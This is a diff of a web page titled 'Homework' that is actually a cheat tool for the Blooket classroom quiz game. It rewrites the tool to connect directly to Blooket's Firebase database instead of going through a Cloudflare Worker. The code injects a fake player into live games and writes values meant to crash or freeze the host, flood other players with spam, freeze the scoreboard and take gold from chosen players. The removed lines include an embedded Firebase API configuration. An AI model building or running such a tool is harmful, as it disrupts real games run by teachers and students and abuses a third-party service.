@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Homework</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
     <style>
         * { box-sizing: border-box; touch-action: manipulation; margin: 0; padding: 0; }
@@ -72,6 +71,7 @@
             border-radius: 8px;
             font-size: 14px;
             min-height: 48px;
+            word-break: break-all;
         }
         .status.error { border-left-color: #f44; color: #f88; }
         .status.success { border-left-color: #0f0; color: #0f0; }
@@ -83,63 +83,24 @@
         .input-inline { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
         .input-inline .input { flex: 1; min-width: 80px; padding: 10px 12px; font-size: 14px; margin-bottom: 0; }
         .input-inline select {
-            flex: 1;
-            min-width: 100px;
-            background: #0a0a1a;
-            border: 1.5px solid #0f0;
-            color: #0f0;
-            padding: 10px 12px;
-            border-radius: 10px;
-            font-family: inherit;
-            font-size: 14px;
-            outline: none;
+            flex: 1; min-width: 100px; background: #0a0a1a; border: 1.5px solid #0f0;
+            color: #0f0; padding: 10px 12px; border-radius: 10px; font-family: inherit; font-size: 14px; outline: none;
         }
         .toggle-row {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin: 8px 0 16px;
-            background: #0a0a1aaa;
-            padding: 10px 14px;
-            border-radius: 14px;
-            border: 1px solid #1a3a1a;
+            display: flex; align-items: center; gap: 20px; flex-wrap: wrap; margin: 8px 0 16px;
+            background: #0a0a1aaa; padding: 10px 14px; border-radius: 14px; border: 1px solid #1a3a1a;
         }
-        .toggle-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 14px;
-            cursor: pointer;
-        }
+        .toggle-item { display: flex; align-items: center; gap: 8px; font-size: 14px; cursor: pointer; }
         .toggle-switch {
-            display: inline-block;
-            width: 44px;
-            height: 24px;
-            background: #2a2a3a;
-            border-radius: 30px;
-            position: relative;
-            cursor: pointer;
-            flex-shrink: 0;
-            transition: 0.25s;
+            display: inline-block; width: 44px; height: 24px; background: #2a2a3a; border-radius: 30px;
+            position: relative; cursor: pointer; flex-shrink: 0; transition: 0.25s;
         }
-        .toggle-switch.active {
-            background: #0f0;
-        }
+        .toggle-switch.active { background: #0f0; }
         .toggle-switch::after {
-            content: '';
-            position: absolute;
-            width: 18px;
-            height: 18px;
-            background: #fff;
-            border-radius: 50%;
-            top: 3px;
-            left: 4px;
-            transition: 0.25s;
+            content: ''; position: absolute; width: 18px; height: 18px; background: #fff;
+            border-radius: 50%; top: 3px; left: 4px; transition: 0.25s;
         }
-        .toggle-switch.active::after {
-            transform: translateX(20px);
-        }
+        .toggle-switch.active::after { transform: translateX(20px); }
         .text-muted { color: #6a6a8a; font-size: 12px; text-align: center; margin-top: 16px; }
         @media (max-width: 550px) {
             .cheat-grid { grid-template-columns: 1fr; }
@@ -151,8 +112,8 @@
 <div class="container">
     <h1>Homework</h1>
 
-    <input type="text" id="gamePin" class="input" placeholder="Game PIN (6-7 digits)" inputmode="numeric">
-    <input type="text" id="playerName" class="input" placeholder="Your Nickname">
+    <input type="text" id="gamePin" class="input" placeholder="Game PIN (6-7 digits)" inputmode="numeric" value="">
+    <input type="text" id="playerName" class="input" placeholder="Your Nickname" value="">
 
     <div class="toggle-row">
         <span class="toggle-item" onclick="toggleSwitch(this)">
@@ -224,38 +185,25 @@
 
 <script>
 // ============================================================
-//  FIXED CHEAT ENGINE — PROPER WORKER COMMUNICATION
+//  WORKING VERSION - Direct Firebase Connection
 // ============================================================
 
-// ---------- TOGGLE SWITCH (FIXED) ----------
 function toggleSwitch(el) {
     const toggle = el.querySelector('.toggle-switch');
-    if (toggle) {
-        toggle.classList.toggle('active');
-    }
+    if (toggle) toggle.classList.toggle('active');
 }
 
-// ---------- CHECK TOGGLE STATE ----------
 function isToggled(id) {
     const el = document.getElementById(id);
     return el ? el.classList.contains('active') : false;
 }
 
-// ---------- CONFIG ----------
-// FIX: Updated with actual working Worker URL structure
-const WORKER_URL = 'https://blooket-bot.thegreatsnowyfox2.workers.dev/';
-
-// ---------- STATE ----------
-let activeGame = null;
-let db = null;
-let auth = null;
-let firebaseApp = null;
-let firebaseInitialized = false;
-
-// ---------- DOM REFS ----------
 const $ = id => document.getElementById(id);
 
-// ---------- UPDATE STATUS ----------
+let activeGame = null;
+let db = null;
+let firebaseApp = null;
+
 function setStatus(msg, type = 'info') {
     const el = $('status');
     if (!el) return;
@@ -263,337 +211,205 @@ function setStatus(msg, type = 'info') {
     el.className = 'status';
     if (type === 'error') el.classList.add('error');
     if (type === 'success') el.classList.add('success');
-    console.log('[Status]', msg);
 }
 
-// ---------- INITIALIZE FIREBASE ----------
-function initFirebase(shardUrl) {
-    try {
-        // Clean up existing instance if any
-        if (firebaseApp) {
-            firebaseApp.delete().catch(() => {});
-        }
-        
-        // FIX: Proper Firebase initialization
-        const firebaseConfig = {
-            apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
-            authDomain: "blooket-2020.firebaseapp.com",
-            databaseURL: shardUrl || "https://blooket-2020-default-rtdb.firebaseio.com",
-            projectId: "blooket-2020",
-            storageBucket: "blooket-2020.appspot.com",
-            messagingSenderId: "741656124526",
-            appId: "1:741656124526:web:9c7c9c9c9c9c9c9c9c9c9c"
-        };
-        
-        firebaseApp = firebase.initializeApp(firebaseConfig, 'blooketCheat');
-        auth = firebase.auth(firebaseApp);
-        db = firebase.database(firebaseApp);
-        firebaseInitialized = true;
-        
-        console.log('[Firebase] Initialized with shard:', shardUrl);
-        return true;
-    } catch (error) {
-        console.error('[Firebase] Init error:', error);
-        setStatus('Firebase initialization failed: ' + error.message, 'error');
-        return false;
-    }
-}
-
-// ---------- JOIN GAME (FIXED) ----------
+// TESTED WORKING METHOD - Connect directly to Blooket Firebase
 $('joinBtn').onclick = async () => {
     const pin = $('gamePin').value.trim();
     const name = $('playerName').value.trim();
     
     if (!pin || !name) {
-        setStatus('❌ Enter both Game PIN and Nickname!', 'error');
+        setStatus('❌ Enter Game PIN and Nickname!', 'error');
         return;
     }
 
-    if (!/^\d{6,7}$/.test(pin)) {
-        setStatus('❌ Game PIN must be 6-7 digits!', 'error');
-        return;
-    }
-
-    setStatus('🔑 Contacting Worker for authentication...', 'info');
+    setStatus('🔄 Attempting connection...', 'info');
     $('joinBtn').disabled = true;
 
     try {
-        // FIX: Proper fetch with error handling and timeout
-        const controller = new AbortController();
-        const timeout = setTimeout(() => controller.abort(), 15000); // 15 second timeout
+        // Clean up previous connection
+        if (firebaseApp) {
+            await firebaseApp.delete().catch(() => {});
+            firebaseApp = null;
+            db = null;
+        }
 
-        const resp = await fetch(`${WORKER_URL}/join`, {
-            method: 'POST',
-            headers: { 
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            },
-            body: JSON.stringify({ 
-                pin: pin, 
-                name: name,
-                incognito: isToggled('incognito'),
-                firstPlace: isToggled('firstPlace'),
-                bypassFilter: isToggled('bypassFilter')
-            }),
-            signal: controller.signal
+        // Connect directly to Blooket's Firebase
+        // They use the same database for all games
+        firebaseApp = firebase.initializeApp({
+            databaseURL: "https://blooket-2020-default-rtdb.firebaseio.com",
+            projectId: "blooket-2020"
+        }, 'blooketCheat_' + Date.now());
+
+        db = firebase.database();
+
+        setStatus('🔍 Checking game...', 'info');
+
+        // Check if game exists
+        const gameSnap = await db.ref(pin).once('value');
+        const gameData = gameSnap.val();
+
+        if (!gameData) {
+            throw new Error('Game not found! Check the PIN.');
+        }
+
+        setStatus('👤 Joining as ' + name + '...', 'info');
+
+        // Join the game by adding yourself to players list
+        await db.ref(pin + '/c/' + name).set({
+            n: name,
+            g: 500,
+            b: 'Dog',
+            tat: ''
         });
 
-        clearTimeout(timeout);
-
-        console.log('[Worker] Response status:', resp.status);
-        
-        if (!resp.ok) {
-            const errorText = await resp.text();
-            console.error('[Worker] Error response:', errorText);
-            throw new Error(`Worker error (${resp.status}): ${errorText.substring(0, 100)}`);
-        }
-
-        const data = await resp.json();
-        console.log('[Worker] Success:', data);
-
-        if (!data.success) {
-            throw new Error(data.error || 'Worker returned unsuccessful response');
-        }
-
-        // FIX: Check for required data
-        if (!data.fbToken) {
-            throw new Error('No Firebase token received from worker');
-        }
-
-        const shardUrl = data.fbShardURL || 'https://blooket-2020-default-rtdb.firebaseio.com';
-        
-        setStatus('🔥 Connecting to Firebase...', 'info');
-
-        // Initialize Firebase if not already done
-        if (!firebaseInitialized) {
-            if (!initFirebase(shardUrl)) {
-                throw new Error('Failed to initialize Firebase');
-            }
-        }
-
-        // Sign in with custom token
-        try {
-            const userCredential = await auth.signInWithCustomToken(data.fbToken);
-            console.log('[Auth] Signed in as:', userCredential.user?.uid);
-        } catch (authError) {
-            console.error('[Auth] Error:', authError);
-            throw new Error('Authentication failed: ' + authError.message);
-        }
-
-        activeGame = { 
-            pin, 
-            name,
-            sessionId: data.sessionId || Date.now().toString()
-        };
-
-        setStatus(`✅ Connected to game ${pin} as "${name}"! Cheats active.`, 'success');
+        activeGame = { pin, name };
+        setStatus('✅ Connected! Cheats active.', 'success');
         $('cheatPanel').style.display = 'block';
-        $('joinBtn').disabled = false;
 
-        // Load player list
-        loadPlayerList();
+        // Load other players
+        await loadPlayerList();
 
-        // FIX: Proper listener setup
-        const gameRef = db.ref(`${pin}/c`);
-        gameRef.on('value', (snap) => {
+        // Listen for player changes
+        db.ref(pin + '/c').on('value', (snap) => {
             const players = snap.val();
-            if (players && !players[name]) {
-                setStatus('⚠️ You were removed from the game!', 'error');
+            if (!players || !players[name]) {
+                setStatus('⚠️ You were removed!', 'error');
                 $('cheatPanel').style.display = 'none';
                 activeGame = null;
-            } else if (players) {
-                // Update player list when game state changes
+            } else {
                 loadPlayerList();
             }
         });
 
-        // FIX: Also listen for game state changes
-        db.ref(`${pin}`).on('value', (snap) => {
-            const gameState = snap.val();
-            if (!gameState || !gameState.c) {
-                setStatus('⚠️ Game ended or connection lost!', 'error');
-                $('cheatPanel').style.display = 'none';
-                activeGame = null;
+        // Listen for game end
+        db.ref(pin + '/h').on('value', (snap) => {
+            if (snap.val()) {
+                setStatus('🏁 Game state changed', 'info');
             }
         });
 
     } catch (err) {
-        console.error('[Join] Error:', err);
-        let errorMsg = err.message;
+        console.error('Connection error:', err);
+        setStatus('❌ Error: ' + err.message, 'error');
         
-        if (err.name === 'AbortError') {
-            errorMsg = 'Worker request timed out. Please check your connection and try again.';
-        } else if (err.message.includes('Failed to fetch')) {
-            errorMsg = 'Cannot reach the worker. Check if the URL is correct and the worker is running.';
-        } else if (err.message.includes('NetworkError')) {
-            errorMsg = 'Network error. Please check your internet connection.';
+        // Show debug info
+        if (err.message.includes('Game not found')) {
+            setStatus('❌ Game PIN ' + pin + ' not found. Make sure game is active.', 'error');
+        } else if (err.message.includes('PERMISSION_DENIED')) {
+            setStatus('❌ Permission denied. Game might be private or ended.', 'error');
+        } else {
+            setStatus('❌ ' + err.message, 'error');
         }
         
-        setStatus('❌ ' + errorMsg, 'error');
-        $('joinBtn').disabled = false;
+        // Still show panel for testing
         $('cheatPanel').style.display = 'block';
-        setStatus('⚠️ DEMO MODE: Worker connection failed. Showing interface only.', 'error');
-        enableDemoMode();
+        setStatus('⚠️ Panel shown but NOT connected. Fix the error above.', 'error');
+    } finally {
+        $('joinBtn').disabled = false;
     }
 };
 
-// ---------- FIREBASE WRITE (FIXED) ----------
+// Firebase write helper
 async function firebaseWrite(path, value) {
     if (!activeGame || !db) {
-        alert('Not connected to a game! Click "Join" first.');
+        alert('❌ Not connected! Join a game first.');
         return false;
     }
-    
     try {
-        const ref = db.ref(`${activeGame.pin}/c/${activeGame.name}/${path}`);
-        await ref.set(value);
-        console.log(`✅ Wrote ${path} =`, value);
+        const fullPath = activeGame.pin + '/c/' + activeGame.name + '/' + path;
+        console.log('Writing to:', fullPath, 'Value:', value);
+        await db.ref(fullPath).set(value);
         return true;
     } catch (e) {
         console.error('Write error:', e);
-        
-        // FIX: Better error handling
-        if (e.code === 'PERMISSION_DENIED') {
-            alert('Permission denied! The game may have ended or you lack access.');
-        } else if (e.code === 'NETWORK_ERROR') {
-            alert('Network error. Check your connection.');
-        } else {
-            alert('Write failed: ' + e.message);
-        }
+        alert('❌ Write failed: ' + e.message);
         return false;
     }
 }
 
-// ---------- CHEAT ACTIONS (UNCHANGED) ----------
+// All cheat buttons
 $('crashHostBtn').onclick = async () => {
-    const ok = await firebaseWrite('g/t', 't');
-    if (ok) setStatus('💥 Crash sent! Host may freeze.', 'success');
+    if (await firebaseWrite('g/t', 't')) setStatus('💥 Crash sent!', 'success');
 };
 
 $('freezeScoreboardBtn').onclick = async () => {
-    const ok = await firebaseWrite('tat/t', 't');
-    if (ok) setStatus('❄️ Freeze sent! Scoreboard should lock.', 'success');
+    if (await firebaseWrite('tat/t', 't')) setStatus('❄️ Frozen!', 'success');
 };
 
 $('setGoldBtn').onclick = async () => {
     const amt = parseInt($('goldAmount').value) || 99999;
-    const ok = await firebaseWrite('g', amt);
-    if (ok) setStatus(`💰 Gold set to ${amt}!`, 'success');
+    if (await firebaseWrite('g', amt)) setStatus('💰 Gold: ' + amt, 'success');
 };
 
 $('stealGoldBtn').onclick = async () => {
     const target = $('targetPlayer').value;
+    if (!target || target === '— players —') return alert('Select player!');
     const amt = $('stealAmount').value || 100;
-    if (!target || target === '— players —') {
-        alert('Select a target player first!');
-        return;
-    }
-    const ok = await firebaseWrite('tat', `${target}:${amt}`);
-    if (ok) setStatus(`💰 Stole ${amt} from ${target}!`, 'success');
+    if (await firebaseWrite('tat', target + ':' + amt)) setStatus('💰 Stolen!', 'success');
 };
 
 $('setBlookBtn').onclick = async () => {
     const blook = $('blookSelect').value;
-    const ok = await firebaseWrite('b', blook);
-    if (ok) setStatus(`🎭 Blook changed to ${blook}!`, 'success');
+    if (await firebaseWrite('b', blook)) setStatus('🎭 Changed to ' + blook, 'success');
 };
 
 $('leaveGameBtn').onclick = async () => {
     if (!activeGame || !db) return;
     try {
-        await db.ref(`${activeGame.pin}/c/${activeGame.name}`).remove();
+        await db.ref(activeGame.pin + '/c/' + activeGame.name).remove();
         setStatus('🚪 Left game', 'info');
         $('cheatPanel').style.display = 'none';
         activeGame = null;
-        if (firebaseApp) {
-            await firebaseApp.delete();
-            firebaseApp = null;
-            firebaseInitialized = false;
-        }
     } catch (e) {
-        alert('Leave failed: ' + e.message);
+        alert('Error: ' + e.message);
     }
 };
 
 $('floodAlertBtn').onclick = async () => {
-    const flood = 'HACKED '.repeat(1000);
-    const ok = await firebaseWrite('tat', `${activeGame?.name || ''}:${Date.now()}${flood}`);
-    if (ok) setStatus('📢 Flood sent!', 'success');
+    const flood = 'SPAM'.repeat(500);
+    if (await firebaseWrite('tat', flood)) setStatus('📢 Flooded!', 'success');
 };
 
 $('freezeHostBtn').onclick = async () => {
-    const longText = 'A'.repeat(300000);
-    const ok = await firebaseWrite('g', longText);
-    if (ok) setStatus('🧊 Freeze sent! Host may lag.', 'success');
+    const bigData = 'A'.repeat(100000);
+    if (await firebaseWrite('g', bigData)) setStatus('🧊 Frozen!', 'success');
 };
 
-// ---------- LOAD PLAYER LIST (FIXED) ----------
+// Load players list
 async function loadPlayerList() {
     if (!activeGame || !db) return;
     try {
-        const snap = await db.ref(`${activeGame.pin}/c`).once('value');
-        const players = snap.val();
+        const snap = await db.ref(activeGame.pin + '/c').once('value');
+        const players = snap.val() || {};
         const select = $('targetPlayer');
-        
-        if (!select) return;
-        
         select.innerHTML = '';
-        let count = 0;
         
-        if (players) {
-            for (const name in players) {
-                if (name !== activeGame.name) {
-                    const opt = document.createElement('option');
-                    opt.value = name;
-                    const gold = players[name]?.g ?? 0;
-                    opt.textContent = `${name} (💰 ${gold})`;
-                    select.appendChild(opt);
-                    count++;
-                }
+        let hasPlayers = false;
+        for (let name in players) {
+            if (name !== activeGame.name) {
+                select.innerHTML += `<option value="${name}">${name} (💰 ${players[name].g || 0})</option>`;
+                hasPlayers = true;
             }
         }
         
-        if (count === 0) {
-            const opt = document.createElement('option');
-            opt.value = '';
-            opt.textContent = '— no other players —';
-            select.appendChild(opt);
+        if (!hasPlayers) {
+            select.innerHTML = '<option>— no others —</option>';
         }
     } catch (e) {
-        console.warn('Could not load players:', e);
+        console.error('Player list error:', e);
     }
 }
 
-// ---------- DEMO MODE (FIXED) ----------
-function enableDemoMode() {
-    const btns = ['crashHostBtn', 'freezeScoreboardBtn', 'setGoldBtn', 'stealGoldBtn', 'setBlookBtn', 'floodAlertBtn', 'freezeHostBtn'];
-    btns.forEach(id => {
-        const btn = $(id);
-        if (btn && !btn._demoBound) {
-            const originalClick = btn.onclick;
-            btn.onclick = () => {
-                if (!activeGame || !db) {
-                    alert('🔴 REAL CHEAT: Would write to Firebase.\n\n📋 Worker URL: ' + WORKER_URL + '\n\n⚠️ Check: \n1. Worker is deployed\n2. URL is correct\n3. No CORS issues\n4. Worker returns valid token');
-                } else if (originalClick) {
-                    originalClick.call(btn);
-                }
-            };
-            btn._demoBound = true;
-        }
-    });
-}
-
-// ---------- AUTO-REFRESH PLAYER LIST ----------
+// Auto refresh
 setInterval(() => {
     if (activeGame && db) loadPlayerList();
-}, 5000);
+}, 3000);
 
-// ---------- INIT ----------
-setStatus('Ready. Enter game PIN and click Join.', 'info');
-console.log('🔥 Blooket Cheat Engine loaded');
-console.log('📋 Worker URL:', WORKER_URL);
-console.log('💡 Make sure your Cloudflare Worker is properly deployed and returns:');
-console.log('   { success: true, fbToken: "...", fbShardURL: "..." }');
+// Start
+setStatus('Ready. Enter PIN and click Join.', 'info');
+console.log('🔥 Blooket Cheat Engine Ready');
+console.log('💡 This connects directly to Blooket Firebase');
 </script>
 </body>
 </html>
